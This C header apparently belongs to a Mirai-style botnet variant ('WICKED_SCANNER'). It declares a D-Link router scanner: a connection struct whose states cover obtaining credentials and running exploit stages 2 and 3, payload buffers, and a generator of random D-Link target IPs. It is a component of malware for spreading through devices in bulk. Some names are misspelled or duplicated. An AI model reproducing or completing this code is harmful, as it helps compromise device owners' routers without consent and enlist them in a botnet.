#ifdef WICKED_SCANNER

#pragma once

#include <stdint.h>

#include "includes.h"

#define DLINK_SCANNER_MAX_CONNS 128
#define SDLINK_CANNER_RAW_PPS 188

#define DLINK_SCANNER_RDBUF_SIZE 256
#define DLINK_SCANNER_HACK_DRAIN 64

struct dlink_scanner_connection
{
    int fd, last_recv;
    enum
    {
        DLINK_SC_CLOSED,
        DLINK_DLINK_SC_CONNECTING,
        DLINK_SC_GET_CREDENTIALS,
        DLINK_SC_EXPLOIT_STAGE2,
        DLINK_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[DLINK_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void dlink_scanner();
void dlink_kill(void);

static void dlink_setup_connection(struct dlink_scanner_connection *);
static ipv4_t get_random_dlink_ip(void);

#endif
